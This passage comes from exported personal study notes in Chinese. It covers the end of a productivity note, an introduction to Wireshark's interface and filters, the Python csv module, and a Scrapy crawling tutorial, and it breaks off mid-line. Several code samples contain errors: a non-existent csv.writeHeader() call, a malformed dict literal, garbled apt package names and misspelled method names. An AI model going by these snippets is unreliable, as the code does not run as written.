第三，打破负罪感幻觉；\n我们经常会陷入的一种状态就是，明明正在专注做某件事，突然，一条来自客户、导师或者朋友的信息，又或者某个突发事件引起你的兴趣。你自然而然就会去处理。如此一来，你的工作流就被打断。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141858.png\" width=\"700px\"/>\n\n番茄时钟就是为了让你尽量少被打断，尽力专注、高效地完成手上的事情。但如果要从根本上解决这种问题的话，那就是打破这种没有及时接到电话，没有及时处理问题的负罪感幻觉。\n\n这里，要分清楚两个东西——负罪感和负罪感幻觉。\n\n假如朋友突发紧急情况，不得不需要你的帮助，而你不去。当良心过意不去的时候，那种感觉就叫负罪感。而如果朋友明知你手头上有重要的事情要做，而非要带你来一局游戏，那种害怕拒绝而不被当作朋友的感觉，我把它成为负罪感幻觉。\n\n类似的幻觉还有，发来无关紧要的消息，你必须秒回；突然交给你的任务，你现在就要处理甚至给一个满意的答复。\n\n要把执行清单中的事情做得更高效，最好打破这种负罪感幻觉。消息可以之后再回；电话可以稍后再打；决定可以晚些再做；即便是他人突然交给你的任务，十有八九也并不需要立即处理。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141913.png\" width=\"700px\"/>\n\n本着为所有事情负责任的态度，已经安排好的事情，请尽量严格按照自己的方式去处理完成；后来出现的事情，不要自乱阵脚，先让它过一遍 GTD，再行处理。\n\n通过以上三种方式，很大程度上，就能保障执行清单质量和效率了。\n\n# 全局复盘\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525142851.png\" width=\"700px\"/>\n"
  },
  {
    "title": "./notes/软件/Wireshark.md",
    "body": "# 认识Wireshark界面\n## 欢迎界面\n打开软件，默认进入软件欢迎页面，如下图所示：\n![](https://gitee.com/NaisWang/images/raw/master/img/20211021115509.png)\n界面列出了当前可以选择的网络形式。如果当前电脑用的有线，则选择以太网；如果是用的WiFi，列表中会出现WiFi，选择即可。\n\n## 主界面\n选择网络形式之后，打开的主界面就自动抓取从本机ip发出去或者接受到的网络包。\n![](https://gitee.com/NaisWang/images/raw/master/img/20211021115536.png)\n\n整体来说，界面主要分为以下几部分：\n- 菜单栏：Wireshark的标准菜单栏。 \n- 工具栏：常用功能的快捷图标按钮，提供快速访问菜单中经常用到的项目的功能。\n- 过滤器：提供处理当前显示过滤得方法。\n- Packet List面板：显示每个数据帧的摘要。这里采用表格的形式列出了当前捕获文件中的所有数据包，其中包括了数据包序号、数据包捕获的相对时间、数据包的源地址和目标地址、数据包的协议以及在数据包中找到的概况信息等。 \n- Packet Details面板：分析数据包的详细信息。这个面板分层次地显示了一个数据包中的内容，并且可以通过展开或是收缩来显示这个数据包中所捕获的全部内容。\n- Packet Bytes面板：以十六进制和ASCII码的形式显示数据包的内容。这里显 示了一个数据包未经处理的原始样子，也就是在链路上传播时的样子。 \n- 状态栏：包含有专家信息、注释、包的数量和Profile。\n\n### 过滤器\n当进行数据包捕获时，只有那些满足给定的包含/排除表达式的数据包会被捕获。\n常见的过滤条件有：\n- 过滤源ip、目的ip——如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1。\n- 端口过滤——如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包。\n- 协议过滤——比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议\n- http模式过滤——如过滤get包，http.request.method==\"GET\",过滤post包，http.request.method==\"POST\"\n- 连接符and——过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。\n\n### Packet List面板\n![](https://gitee.com/NaisWang/images/raw/master/img/20211021115650.png)\n列表中的每行显示捕捉文件的一个包。如果您选择其中一行，该包得更多情况会显示在\"Packet Detail/包详情\"，\"Packet Byte/包字节\"面板。\nPacket List面板中默认包含了几列，如No、Time、Source和Destination等。\n- No. 包的编号，编号不会发生改变，即使进行了过滤也同样如此\n- Time 包的时间戳。包时间戳的格式可以自行设置\n- Source 显示包的源地址。\n- Destination 显示包的目标地址。\n- Protocal 显示包的协议类型的简写\n- Info 包内容的附加信息\n\n### Packet Details面板\n![](https://gitee.com/NaisWang/images/raw/master/img/20211021115730.png)\n\n该面板显示包列表面板选中包的协议及协议字段，协议及字段以树状方式组织。可以展开或折叠进行查看。\n\n### Packet Bytes面板\n![](https://gitee.com/NaisWang/images/raw/master/img/20211021115754.png)\n\n通常在16进制转储形式中，左侧显示包数据偏移量，中间栏以16进制表示，右侧显示为对应的ASCII字符。\n\n\n\n"
  },
  {
    "title": "./notes/python库/csv.md",
    "body": "# 读取csv文件\n```python\nimport csv\n\nwith open('stock.csv', 'r') as fp:\n    reader = csv.reader(fp)\n    # 调用next(reader)后， header的指向会向下移动一次\n    titles = next(reader)\n    for x in reader:\n        print(x)\n```\n\n这样操作，以后获取数据的时候，就要通过下表来获取数据。如果想要在获取数据的时候通过标题来获取。那么可以使用DictReader。示例代码如下：\n\n```python\nimport csv\n\nwith open('stock.csv', 'r') as fp:\n    reader = csv.DictReader(fp)\n    for x in reader:\n        print(x['turnoverVol'])\n```\n\n# 写入数据到csv文件\n\n写入数据到csv文件，需要创建一个writer 对象，主要用到两个方法。一个是writerow，这个是写入一行。一个是writerows，这个是写入多行。示例代码如下：\n\n```python\nimport csv\n\nheaders = ['name', 'age', 'classroom']\nvalues = [\n    {'zhiliao', 18, '111'},\n    {'wenan', 20, '222'},\n    {'bbc', 21, '333'}\n]\n\n# newline默认为\\n\nwith open('test.csv', 'w', newline='') as fp:\n    writer = csv.writer(fp)\n    writer.writerow(headers)\n    writer.writerows(values)\n```\n\n也可以使用字典的方式把数据写入进去。这时候就需要使用DictWriter了。示例代码如下：\n\n```python\nimport csv\n\nheaders = ['name', 'age', 'classroow']\nvalues = [\n    {\"name\": \"wen\", \"age\": 20, \"classroom\": \"222\"},\n    {\"name\": \"wef\", \"age\": 23, \"classroom\": \"333\"},\n]\n\nwith open('test.csv', 'w', newline='') as fp:\n    writer = csv.DictWriter(fp, headers)\n    # 写入表头数据的时候，需要调用writeheader方法\n    csv.writeHeader()\n    writer.writerow({'name': 'zhiliao', 'age': 29, 'classroom', '111'})\n    writer.writerows(values)\n\n```"
  },
  {
    "title": "./notes/python库/scrapy.md",
    "body": "\n# Scrapy框架\n- Scrapy是用纯Python实现一个为了爬取网站数据、提取结构性数据而编写的应用框架，用途非常广泛。\n- 框架的力量，用户只需要定制开发几个模块就可以轻松的实现一个爬虫，用来抓取网页内容以及各种图片，非常之方便。\n- Scrapy 使用了 Twisted`['twɪstɪd]`(其主要对手是Tornado)异步网络框架来处理网络通讯，可以加快我们的下载速度，不用自己去实现异步框架，并且包含了各种中间件接口，可以灵活的完成各种需求。\n\n# Scrapy架构图\n(绿线是数据流向)\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210605153918.png\" width=\"700px\"/>\n\n- `Scrapy Engine(引擎)`: 负责`Spider`、`ItemPipeline`、`Downloader`、`Scheduler`中间的通讯，信号、数据传递等。\n- `Scheduler(调度器)`: 它负责接受`引擎`发送过来的Request请求，并按照一定的方式进行整理排列，入队，当`引擎`需要时，交还给`引擎`。\n- `Downloader（下载器）`：负责下载`Scrapy Engine(引擎)`发送的所有Requests请求，并将其获取到的Responses交还给`Scrapy Engine(引擎)`，由`引擎`交给`Spider`来处理，\n- `Spider（爬虫）`：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给`引擎`，再次进入`Scheduler(调度器)`，\n- `Item Pipeline(管道)`：它负责处理`Spider`中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方.\n- `Downloader Middlewares（下载中间件）`：你可以当作是一个可以自定义扩展下载功能的组件。\n- `Spider Middlewares（Spider中间件）`：你可以理解为是一个可以自定扩展和操作`引擎`和`Spider`中间`通信`的功能组件（比如进入`Spider`的Responses;和从`Spider`出去的Requests）\n\n## Scrapy的运作流程\n\n代码写好，程序开始运行...\n\n1. `引擎`：Hi！`Spider`, 你要处理哪一个网站？\n2. `Spider`：老大要我处理xxxx.com。\n3. `引擎`：你把第一个需要处理的URL给我吧。\n4. `Spider`：给你，第一个URL是xxxxxxx.com。\n5. `引擎`：Hi！`调度器`，我这有request请求你帮我排序入队一下。\n6. `调度器`：好的，正在处理你等一下。\n7. `引擎`：Hi！`调度器`，把你处理好的request请求给我。\n8. `调度器`：给你，这是我处理好的request\n9. `引擎`：Hi！下载器，你按照老大的`下载中间件`的设置帮我下载一下这个request请求\n10. `下载器`：好的！给你，这是下载好的东西。（如果失败：sorry，这个request下载失败了。然后`引擎`告诉`调度器`，这个request下载失败了，你记录一下，我们待会儿再下载）\n11. `引擎`：Hi！`Spider`，这是下载好的东西，并且已经按照老大的`下载中间件`处理过了，你自己处理一下（注意！这儿responses默认是交给`def parse()`这个函数处理的）\n12. `Spider`：（处理完毕数据之后对于需要跟进的URL），Hi！`引擎`，我这里有两个结果，这个是我需要跟进的URL，还有这个是我获取到的Item数据。\n13. `引擎`：Hi ！`管道` 我这儿有个item你帮我处理一下！`调度器`！这是需要跟进URL你帮我处理下。然后从第四步开始循环，直到获取完老大需要全部信息。\n14. `管道``调度器`：好的，现在就做！\n\n**注意！只有当调度器中不存在任何request了，整个程序才会停止，（也就是说，对于下载失败的URL，Scrapy也会重新下载。）**\n\n制作 Scrapy 爬虫 一共需要4步：\n\n- 新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目\n- 明确目标 （编写items.py）：明确你想要抓取的目标\n- 制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页\n- 存储内容 （pipelines.py）：设计管道存储爬取内容\n\n## 入门案例\n\n安装和文档：\n\n1. 安装：通过pip install scrapy即可安装。\n2. Scrapy官方文档：http://doc.scrapy.org/en/latest\n3. Scrapy中文文档：http://scrapy-chs.readthedocs.io/zh_CN/latest/index.html\n4. 注意：\n   1. 在ubuntu上安装scrapy之前，需要先安装以下依赖：\n      sudo apt-get install python-dev python-pip 1ibxml2-dev 1ibxslt1-dev z1iblg-dev 1ibffi-dev libss1-dev，然后再通过pip install scrapy 安装。\n   2. 如果在windous系统下，提示这个错误ModulelNlotFoundError:No module named 'win32api'，那么使用以下命令可以解决：pip install pypiwin32。\n\n学习目标\n\n- 创建一个Scrapy项目\n- 定义提取的结构化数据(Item)\n- 编写爬取网站的 Spider 并提取出结构化数据(Item)\n- 编写 Item Pipelines 来存储提取到的Item(即结构化数据)\n\n一. 新建项目(scrapy startproject)\n\n- 在开始爬取之前，必须创建一个新的Scrapy项目。进入自定义的项目目录中，运行下列命令：\n\n```shell\nscrapy startproject mySpider\n```\n\n- 其中， mySpider 为项目名称，可以看到将会创建一个 mySpider 文件夹，目录结构大致如下：\n\n![img](http://www.nikola.ltd/s/python/Spider/file/images/7.2.png)\n\n下面来简单介绍一下各个主要文件的作用：\n\n> scrapy.cfg ：项目的配置文件\n>\n> mySpider/ ：项目的Python模块，将会从这里引用代码\n>\n> mySpider/items.py ：项目的目标文件\n>\n> mySpider/pipelines.py ：项目的管道文件\n>\n> mySpider/settings.py ：项目的设置文件\n>\n> mySpider/spiders/ ：存储爬虫代码目录\n\n二、明确目标(mySpider/items.py)\n\n我们打算抓取：http://www.itcast.cn/channel/teacher.shtml 网站里的所有讲师的姓名、职称和个人信息。\n\n1. 打开mySpider目录下的items.py\n2. Item 定义结构化数据字段，用来保存爬取到的数据，有点像Python中的dict，但是提供了一些额外的保护减少错误。\n3. 可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field的类属性来定义一个Item（可以理解成类似于ORM的映射关系）。\n4. 接下来，创建一个ItcastItem 类，和构建item模型（model）。\n\n```python\nimport scrapy\n\nclass ItcastItem(scrapy.Item):\n    name = scrapy.Field()\n    level = scrapy.Field()\n    info = scrapy.Field()\n```\n\n三、制作爬虫 （spiders/itcastSpider.py）\n\n**爬虫功能要分两步：**\n\n1. 爬数据\n\n- 在当前目录下输入命令，将在`mySpider/spider`目录下创建一个名为`itcast`的爬虫，并指定爬取域的范围：\n\n```\nscrapy genspider itcast \"itcast.cn\"\n```\n\n- 打开 mySpider/spider目录里的 itcast.py，默认增加了下列代码:\n\n```python\nimport scrapy\n\nclass ItcastSpider(scrapy.Spider):\n    name = \"itcast\"\n    allowed_domains = [\"itcast.cn\"]\n    start_urls = (\n        'http://www.itcast.cn/',\n    )\n\n    def parse(self, response):\n        pass\n```\n\n其实也可以由我们自行创建itcast.py并编写上面的代码，只不过使用命令可以免去编写固定代码的麻烦\n\n要建立一个Spider， 你必须用scrapy.Spider类创建一个子类，并确定了三个强制的属性 和 一个方法。\n\n- `name = \"\"` ：这个爬虫的识别名称，必须是唯一的，在不同的爬虫必须定义不同的名字。\n- `allow_domains = []` 是搜索的域名范围，也就是爬虫的约束区域，规定爬虫只爬取这个域名下的网页，不存在的URL会被忽略。\n- `start_urls = ()` ：爬取的URL元祖/列表。爬虫从这里开始抓取数据，所以，第一次下载的数据将会从这些urls开始。其他子URL将会从这些起始URL中继承性生成。\n- `parse(self, response)` ：解析的方法，每个初始URL完成下载后将被调用，调用的时候传入从每一个URL传回的Response对象来作为唯一参数，主要作用如下：\n  1. 负责解析返回的网页数据(response.body)，提取结构化数据(生成item)\n  2. 生成需要下一页的URL请求。\n  3. response对象内部有xpath方法\n\n将start_urls的值修改为需要爬取的第一个url\n\n```python\nstart_urls = (\"http://www.itcast.cn/channel/teacher.shtml\",)\n```\n\n修改parse()方法\n\n```python\ndef parse(self, response):\n    with open(\"teacher.html\", \"w\") as f:\n        f.write(response.text)\n```\n\n然后运行一下看看，在mySpider目录下执行：\n\n```python\nscrapy crawl itcast\n```\n\n是的，就是 itcast，看上面代码，它是 ItcastSpider 类的 name 属性，也就是使用 `scrapy genspider`命令的爬虫名。\n\n一个Scrapy爬虫项目里，可以存在多个爬虫。各个爬虫在执行时，就是按照 name 属性来区分。\n\n运行之后，如果打印的日志出现 `[scrapy] INFO: Spider closed (finished)`，代表执行完成。 之后当前文件夹中就出现了一个 teacher.html 文件，里面就是我们刚刚要爬取的网页的全部源代码信息。\n\n```python\n# 注意，Python2.x默认编码环境是ASCII，当和取回的数据编码格式不一致时，可能会造成乱码；\n# 我们可以指定保存内容的编码格式，一般情况下，我们可以在代码最上方添加：\nimport sys\nreload(sys)\nsys.setdefaultencoding(\"utf-8\")\n# 这三行代码是Python2.x里解决中文编码的万能钥匙，经过这么多年的吐槽后Python3学乖了，默认编码是Unicode了...(祝大家早日拥抱Python3)\n```\n\n2. 取数据\n\n- 爬取整个网页完毕，接下来的就是的取过程了，首先观察页面源码：\n\n![img](http://www.nikola.ltd/s/python/Spider/file/images/teacher_html.png)\n\n```html\n<div class=\"li_txt\">\n    <h3>  xxx  </h3>\n    <h4> xxxxx </h4>\n    <p> xxxxxxxx </p>\n```\n\n是不是一目了然？直接上XPath开始提取数据吧。\n\n- 我们之前在mySpider/items.py 里定义了一个ItcastItem类。 这里引入进来\n\n```python\n  from mySpider.items import ItcastItem\n```\n\n- 然后将我们得到的数据封装到一个 `ItcastItem` 对象中，可以保存每个老师的属性：\n\n```python\nfrom mySpider.items import ItcastItem\n\ndef parse(self, response):\n    #open(\"teacher.html\",\"wb\").write(response.body).close()\n\n    # 存放老师信息的集合\n    items = []\n\n    for each in response.xpath(\"//div[@class='li_txt']\"):\n        # 将我们得到的数据封装到一个 `ItcastItem` 对象\n        item = ItcastItem()\n        #extract()方法返回的都是unicode字符串\n        name = each.xpath(\"h3/text()\").extract()\n        title = each.xpath(\"h4/text()\").extract()\n        info = each.xpath(\"p/text()\").extract()\n\n        #xpath返回的是包含一个元素的列表\n        item['name'] = name[0]\n        item['title'] = title[0]\n        item['info'] = info[0]\n\n        items.append(item)\n\n    # 直接返回最后数据\n    return items\n```\n\n- 我们暂时先不处理管道，后面会详细介绍。\n\n保存数据\n\nscrapy保存信息的最简单的方法主要有四种，-o 输出指定格式的文件，，命令如下：\n\n```python\n# json格式，默认为Unicode编码\nscrapy crawl itcast -o teachers.json\n\n# json lines格式，默认为Unicode编码\nscrapy crawl itcast -o teachers.jsonl\n\n# csv 逗号表达式，可用Excel打开\nscrapy crawl itcast -o teachers.csv\n\n# xml格式\nscrapy crawl itcast -o teachers.xml\n```\n\n思考\n\n如果将代码改成下面形式，结果完全一样。\n\n请思考 yield 在这里的作用：\n\n```python\nfrom mySpider.items import ItcastItem\n\ndef parse(self, response):\n    #open(\"teacher.html\",\"wb\").write(response.body).close()\n\n    # 存放老师信息的集合\n    #items = []\n\n    for each in response.xpath(\"//div[@class='li_txt']\"):\n        # 将我们得到的数据封装到一个 `ItcastItem` 对象\n        item = ItcastItem()\n        #extract()方法返回的都是unicode字符串\n        name = each.xpath(\"h3/text()\").extract()\n        title = each.xpath(\"h4/text()\").extract()\n        info = each.xpath(\"p/text()\").extract()\n\n        #xpath返回的是包含一个元素的列表\n        item['name'] = name[0]\n        item['title'] = title[0]\n        item['info'] = info[0]\n\n        #items.append(item)\n\n        #将获取的数据交给pipelines\n        yield item\n\n    # 返回数据，不经过pipeline\n    #return items\n```\n\n由于我们每次运行时，都要在命令行中运行，为了更方便，我们可以在项目根目录下创建一个start.py，用来运行执行这些命令\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute([\"scrapy\", \"crawl\", \"itcast\"])\n```\n\n## pipelines.py\n\n前面的博文我们都是使用”-o *.josn”参数将提取的item数据输出到json文件，若不加此参数提取到的数据则不会输出。其实当Item在Spider中被收集之后，它将会被传递到Item Pipeline，这些Item Pipeline组件按定义的顺序处理Item。当我们创建项目时，scrapy会生成一个默认的pipelines.py，如：\n\n```python\nvim pipelines.py\nclass DoubanPipeline(object):\n    def process_item(self, item, spider):\n        return item但是我们没有具体定义，因此执行爬虫并不会输出结果。\n```\n\n下面我们还是通过定义pipeline，使提取到的item通过pipeline输出到json文件、mongodb数据库。\n本文爬虫以scrapy爬虫之crawlspide爬取豆瓣近一周同城活动为例，在此我们更新item、item pipeline即可。\n\n### 输出到json文件\n\n1. 定义item\n\n```python\ndef filter_string(x):\n    str = x.split(':')\n    return str[1].strip()\nclass tongcheng(scrapy.Item):\n        #主题\n        title = scrapy.Field()\n        #时间\n        time = scrapy.Field()\n        #地址\n        address = scrapy.Field(output_processor=Join())\n        #票价\n        money = scrapy.Field()\n        #感兴趣人数\n        intrest = scrapy.Field()\n        #参加人数\n        join = scrapy.Field()\n```\n\n\n\n2. 定义item pipeline\n\n```python\n#以json格式输出\nfrom scrapy.exporters import JsonItemExporter\n#以jl格式输出\n#from scrapy.exporters import JsonLinesItemExporter\n#以csv格式输出 \n#from scrapy.exporters import CsvItemExporter\nclass tongcheng_pipeline_json(object):\n   \n    #可选实现，当spider被开启时，这个方法被调用，常用于初始化操作(常见开启数据库连接,打开文件)\n    def open_spider(self, spider):\n        #输出到tongcheng_pipeline.json文件\n        self.file = open('tongcheng_pipeline.json', 'wb')\n        self.exporter = JsonItemExporter(self.file, encoding='utf-8')\n        self.exporter.start_exporting()\n    \n    #可选实现，当spider被关闭时，这个方法被调用，常用于关闭数据库连接\n    def close_spier(selef, spider):\n        self.exporter.finish_exporting()\n        self.file.close()\n    \n    # 当yield过来数据时调用\n    # item是要处理的item对象， spider当前要处理的spider对象\n    # 返回item就会继续给优先级低的item pipeline二次处理， 如果直接抛出DropItem的异常就直接丢弃该item\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n```\n\n使用JsonLinesItemExporter保存数据\n\n```python\n 1 # -*- coding: utf-8 -*-\n 2 from scrapy.exporters import JsonLinesItemExporter\n 3 \n 4 \n 5 class DemoPipeline(object):\n 6     def __init__(self):\n           # 将下面代码写在open_spider方法中也可以\n 7         self.fp = open(\"duanzi.json\", \"wb\")\n 8         self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n 9 \n10     def open_spider(self, spider):\n11         pass\n12 \n13     def process_item(self, item, spider):\n14         self.exporter.export_item(item)\n15         return item\n16 \n17     def close_spider(self, spider):\n18         self.fp.close()\n```\n\nJsonItemExporter和JsonLinesItemExporter的区别：\n\nJsonItemExporter：每次把数据添加到内存中，最后统一写入到磁盘文件中。好处是，存储的是一个满足json规则的数据。坏处是如果数据量比较大，那么比较耗内存。\n\nJsonLinesItemExporter：每次调用export_item的时候就把这个item存储到磁盘中.坏处是一个字典一行,整个文件不是一个满足json格式的文件.好处是每次数据都直接存到磁盘文件中,不会耗内存,数据相对安全.\n\n3. 激活item pipeline\n   我们的pipeline定义后，需要在配置文件中添加激活才能使用，因此我们需要配置settings.py。\n\n```python\nITEM_PIPELINES = {\n    #默认使用这个，但我们没有定义，因此注释掉。\n    #'douban.pipelines.DoubanPipeline': 300,\n    #在此添加我们新定义的pipeline\n    'douban.pipelines.tongcheng_pipeline_json': 300,\n}\n```\n\n<font color=\"red\">注：</font>如果遇到`TypeError: Object of type Selector is not JSON serializable`错f误，原因如下：\n\n在scrap中`anything.xpath('...')` is a selector, not a string you are missing to add the `.extract_first()` method.\n\n```py\nanything.xpath('...').extract_first()\n```\n\n4. 启动爬虫\n\nscrapy crawl tongcheng\n#打印信息中会显示\n\n```\n2018-01-20 10:48:10 [scrapy.middleware] INFO: Enabled item pipelines:\n['douban.pipelines.tongcheng_pipeline_json']\n....\n\n#查看tongcheng_pipeline.json文件\ncat tongcheng_pipeline.json\n[{\"money\": [\"263元\"], \"address\": \"深圳  深圳市少年宫剧场 深圳市福田区福中一路市少年宫\", \"join\": [\"69 \"], \"intrest\": [\"174 \"], \"title\": [\"孟京辉戏剧作品《一个陌生女人的来信》深圳站\"]},{\"money\": [\"93 - 281元\"], \"address\": \"深圳  南山文体中心剧院 小剧场 深圳市南山区南山大道南山文体中心\", \"join\": [\"4 \"], \"intrest\": [\"11 \"],\"title\": [\"2018第五届城市戏剧节 诗·歌·舞变奏三幕剧《木心·人曲》-深圳\"]}.....]\n```\n\n如上显示，则说明我们的爬虫调用了配置文件中的pipeline，\n并将提取的item输出到tongcheng_pipeline.json文件了。\n\n注意\n\n1. 在settings.py中设置的pipeline，会被project中的所有爬虫按照优先级默认调用，例如：\n\n```python\nITEM_PIPELINES = {\n    'douban.pipelines.DoubanPipeline': 300,\n    'douban.pipelines.movieTop250_crawlspider_json': 200,\n    'douban.pipelines.tongcheng_pipeline_json': 100,\n}\n```\n\n当我们”scrapy crawl tongcheng”时，会按照优先级从低到高也就是100、200、300顺序调用pipeline，从打印信息中可以看到：\n\n```\n2018-01-20 10:48:10 [scrapy.middleware] INFO: Enabled item pipelines:\n['douban.pipelines.tongcheng_pipeline_json',\ndouban.pipelines.movieTop250_crawlspider_json,\ndouban.pipelines.DoubanPipeline]\n```\n\n\n\n2. 不同spider绑定pipeline\n\n由于一个project中有多个不同功能的爬虫，我们需要将爬虫绑定不同的pipeline，以将提取的内容保存到不同地方。如何实现？\n我们知道scrapy运行会调用不同的配置文件，按照优先级从高到低为：\n\n```\n1.Command line options (most precedence)\n2.Settings per-spider\n3.Project settings module\n4.Default settings per-command\n5.Default global settings (less precedence\n```\n\n我们使用的settings.py属于“Project settings module”\n，因此我们需要使用优先级比它高的配置文件即可实现绑定pipeline，例如“Settings per-spider”。\n\nvim tongcheng.py\n\n```python\n#在下面添加custom_settings即可\nclass TongchengSpider(CrawlSpider):\n    name = 'tongcheng'\n    allowed_domains = ['douban.com']\n    start_urls = ['https://www.douban.com/location/shenzhen/events/week-all']\n    custom_settings = {\n        'ITEM_PIPELINES': {\n            'douban.pipelines.tongcheng_pipeline_json': 300,\n        }\n    }\n    rules = (\n        Rule(LinkExtractor(allow=r'start=10')),\n        Rule(LinkExtractor(allow=r'https://www.douban.com/event/\\d+/'),callback='parse_item'),\n    )   \n    \n    def parse_item(self, response):\n        loader = ItemLoader(item=tongcheng(),selector=response)\n        info = loader.nested_xpath('//div[@class=\"event-info\"]')\n        info.add_xpath('title','h1[@itemprop=\"summary\"]/text()')\n        info.add_xpath('time','div[@class=\"event-detail\"]/ul[@class=\"calendar-strs\"]/li/text()')\n        info.add_xpath('address','div[@itemprop=\"location\"]/span[@class=\"micro-address\"]/span[@class=\"micro-address\"]/text()')\n        info.add_xpath('money','div[@class=\"event-detail\"]/span[@itemprop=\"ticketAggregate\"]/text()')\n        info.add_xpath('intrest','div[@class=\"interest-attend pl\"]/span[1]/text()')\n        info.add_xpath('join','div[@class=\"interest-attend pl\"]/span[3]/text()')\n\n   \t\t\t yield loader.load_item()\n```\n\n\n通过custom_settings我们可以绑定tongcheng_pipeline_json\n，从而避免调用setttings.py中的所有pipeline。\n\n## Spider\n\nSpider类定义了如何爬取某个(或某些)网站。包括了爬取的动作(例如:是否跟进链接)以及如何从网页的内容中提取结构化数据(爬取item)。 换句话说，Spider就是您定义爬取的动作及分析某个网页(或者是有些网页)的地方。\n\n`class scrapy.Spider`是最基本的类，所有编写的爬虫必须继承这个类。\n\n主要用到的函数及调用顺序为：\n\n`__init__()` : 初始化爬虫名字和start_urls列表\n\n`start_requests() 调用make_requests_from url()`:生成Requests对象交给Scrapy下载并返回response\n\n`parse()` : 解析response，并返回Item或Requests（需指定回调函数）。Item传给Item pipline持久化 ， 而Requests交由Scrapy下载，并由指定的回调函数处理（默认parse())，一直进行循环，直到处理完所有的数据为止。\n\n源码参考\n\n```python\n#所有爬虫的基类，用户定义的爬虫必须从这个类继承\nclass Spider(object_ref):\n\n    #定义spider名字的字符串(string)。spider的名字定义了Scrapy如何定位(并初始化)spider，所以其必须是唯一的。\n    #name是spider最重要的属性，而且是必须的。\n    #一般做法是以该网站(domain)(加或不加 后缀 )来命名spider。 例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite\n    name = None\n\n    #初始化，提取爬虫名字，start_ruls\n    def __init__(self, name=None, **kwargs):\n        if name is not None:\n            self.name = name\n        # 如果爬虫没有名字，中断后续操作则报错\n        elif not getattr(self, 'name', None):\n            raise ValueError(\"%s must have a name\" % type(self).__name__)\n\n        # python 对象或类型通过内置成员__dict__来存储成员信息\n        self.__dict__.update(kwargs)\n\n        #URL列表。当没有指定的URL时，spider将从该列表中开始进行爬取。 因此，第一个被获取到的页面的URL将是该列表之一。 后续的URL将会从获取到的数据中提取。\n        if not hasattr(self, 'start_urls'):\n            self.start_urls = []\n\n    # 打印Scrapy执行后的log信息\n    def log(self, message, level=log.DEBUG, **kw):\n        log.msg(message, spider=self, level=level, **kw)\n\n    # 判断对象object的属性是否存在，不存在做断言处理\n    def set_crawler(self, crawler):\n        assert not hasattr(self, '_crawler'), \"Spider already bounded to %s\" % crawler\n        self._crawler = crawler\n\n    @property\n    def crawler(self):\n        assert hasattr(self, '_crawler'), \"Spider not bounded to any crawler\"\n        return self._crawler\n\n    @property\n    def settings(self):\n        return self.crawler.settings\n\n    #该方法将读取start_urls内的地址，并为每一个地址生成一个Request对象，交给Scrapy下载并返回Response\n    #该方法仅调用一次\n    def start_requests(self):\n        for url in self.start_urls:\n            yield self.make_requests_from_url(url)\n\n    #start_requests()中调用，实际生成Request的函数。\n    #Request对象默认的回调函数为parse()，提交的方式为get\n    def make_requests_from_url(self, url):\n        return Request(url, dont_filter=True)\n\n    #默认的Request对象回调函数，处理返回的response。\n    #生成Item或者Request对象。用户必须实现这个类\n    def parse(self, response):\n        raise NotImplementedError\n\n    @classmethod\n    def handles_request(cls, request):\n        return url_is_from_spider(request.url, cls)\n\n    def __str__(self):\n        return \"<%s %r at 0x%0x>\" % (type(self).__name__, self.name, id(self))\n\n    __repr__ = __str__\n```\n\n### 主要属性和方法\n\n- name\n\n  > 定义spider名字的字符串。\n  >\n  > 例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite\n\n- allowed_domains\n\n  > 包含了spider允许爬取的域名(domain)的列表，可选。\n\n- start_urls\n\n  > 初始URL元祖/列表。当没有制定特定的URL时，spider将从该列表中开始进行爬取。\n\n- start_requests(self)\n\n  > 该方法必须返回一个可迭代对象(iterable)。该对象包含了spider用于爬取（默认实现是使用 start_urls 的url）的第一个Request。\n  >\n  > 当spider启动爬取并且未指定start_urls时，该方法被调用。\n\n- parse(self, response)\n\n  > 当请求url返回网页没有指定回调函数时，默认的Request对象回调函数。用来处理网页返回的response，以及生成Item或者Request对象。\n\n- log(self, message[, level, component])\n\n  > 使用 scrapy.log.msg() 方法记录(log)message。 更多数据请参见 [logging](http://www.nikola.ltd/s/python/Spider/file/part04/4.7.html)\n\n案例：腾讯招聘网自动翻页采集\n\n- 创建一个新的爬虫：\n\n```\nscrapy genspider tencent \"tencent.com\"\n```\n\n- 编写items.py\n\n获取职位名称、详细信息、\n\n```python\nclass TencentItem(scrapy.Item):\n    name = scrapy.Field()\n    detailLink = scrapy.Field()\n    positionInfo = scrapy.Field()\n    peopleNumber = scrapy.Field()\n    workLocation = scrapy.Field()\n    publishTime = scrapy.Field()\n```\n\n- 编写tencent.py\n\n```python\n# tencent.py\n\nfrom mySpider.items import TencentItem\nimport scrapy\nimport re\n\nclass TencentSpider(scrapy.Spider):\n    name = \"tencent\"\n    allowed_domains = [\"hr.tencent.com\"]\n    start_urls = [\n        \"http://hr.tencent.com/position.php?&start=0#a\"\n    ]\n\n    def parse(self, response):\n        for each in response.xpath('//*[@class=\"even\"]'):\n\n            item = TencentItem()\n            name = each.xpath('./td[1]/a/text()').extract()[0]\n            detailLink = each.xpath('./td[1]/a/@href').extract()[0]\n            positionInfo = each.xpath('./td[2]/text()').extract()[0]\n            peopleNumber = each.xpath('./td[3]/text()').extract()[0]\n            workLocation = each.xpath('./td[4]/text()').extract()[0]\n            publishTime = each.xpath('./td[5]/text()').extract()[0]\n\n            #print name, detailLink, catalog, peopleNumber, 